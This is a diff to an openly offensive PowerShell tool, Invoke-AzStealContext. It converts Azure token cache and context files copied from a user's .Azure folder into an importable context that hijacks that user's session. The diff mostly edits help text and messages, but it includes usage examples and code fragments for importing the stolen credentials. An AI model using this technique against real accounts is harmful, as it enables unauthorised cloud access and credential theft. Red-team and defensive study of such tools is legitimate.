@@ -3,29 +3,28 @@ Function Invoke-AzStealContext {
     .SYNOPSIS
         A PowerShell function that automates the process of stealing the Azure context of a users .Azure folder.
     .DESCRIPTION
-        When a user authenticates using the Az PowerShell module a .Azure folder is created in the users home folder. This folder contains multipele files including the AzureRmContext.json and TokenCache.dat files. 
-        These files contain all the information a attacker needs to create a 'context file' which is equivalent of the output from the Save-AzContext command. This PowerShell function automates the process a attacker would need to take to create a 'context' file.
-        
-        The AzureRmContext file can have multiple 'contexts'. This happens if the Connect-AzAccount is run multiple times by the same user with different credentials.
-        This function will verify if there are multiple contexts and if so, will ask you which one to use as the default context.        
+        When a user uses the Az PowerShell module a .Azure folder is created in the users home folder. 
+        This folder contains multiple files including the AzureRmContext.json and TokenCache.dat files. 
+        If a user has authenticated using the Connect-AzAccount cmdlet these files contain all the information a attacker needs to create a 'AzContext' file which is equivalent of the output from the Save-AzContext cmdlet. 
+        This PowerShell function automates the process a attacker would need to take to create a 'AzContext' file.
     .PARAMETER Path
         The folder containing the borrowed 'TokenCache.dat' and 'AzureRmContext.json' files.
     .PARAMETER OutFile
-        The Azure context file name to create from the 'TokenCache.dat' and 'AzureRmContext.json' files.
+        The AzContext file name to create from the 'TokenCache.dat' and 'AzureRmContext.json' files.
     .PARAMETER ImportContext
-        If the function should automatically imported the created context file.
+        If the function should automatically imported the created AzContext file.
     .PARAMETER Force
-        Overwrites a exsisting context file.
+        Overwrites a exsisting AzContext file.
     .LINK
         https://github.com/justin-p/AzStealContext
     .EXAMPLE
-        # Create a context file 
+        # Create a AzContext file 
         PS C:\> Invoke-AzStealContext -Path 'Path\To\Borrowed\Files'
     .EXAMPLE
-        # Create a context file and import it
+        # Create a AzContext file and import it
         PS C:\> Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext
     .EXAMPLE
-        # Overwrite a exising OutFile
+        # Overwrite a exising AzContext file
         PS C:\> Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext -Force 
     .NOTES
         Author: Justin Perdok (@JustinPerdok)
@@ -49,7 +48,7 @@ Function Invoke-AzStealContext {
             }
             If (!($force)) {
                 If (Test-Path $(Join-Path $Path $OutFile)) {
-                    Write-Error "The output file `'$(Join-Path $Path $OutFile)`' already exists" -ErrorAction Stop
+                    Write-Error "The AzContext file `'$(Join-Path $Path $OutFile)`' already exists" -ErrorAction Stop
                 }
             }
             If ($ImportContext) {
@@ -100,11 +99,11 @@ Function Invoke-AzStealContext {
             $AzureRmContext | ConvertTo-Json -Depth 100 | Set-Content $(Join-Path $Path $OutFile)
             If ($ImportContext) {
                 [void](Import-AzContext -Profile $(Join-Path $Path $OutFile))
-                Write-Host "Imported stolen Azure context."
+                Write-Host "Imported stolen AzContext file."
                 $((Get-AzContext).Account | Format-Table -AutoSize ID, Type, ExtendedProperties)
             }
             Else {
-                Write-Host "Created stolen Azure context file. Run `'Import-AzContext -Profile $(Join-Path $Path $OutFile)`' to import the context."
+                Write-Host "Created stolen AzContext file. Run `'Import-AzContext -Profile $(Join-Path $Path $OutFile)`' to import the AzContext."
             }
         } Catch {
             $PSCmdlet.ThrowTerminatingError($PSItem)
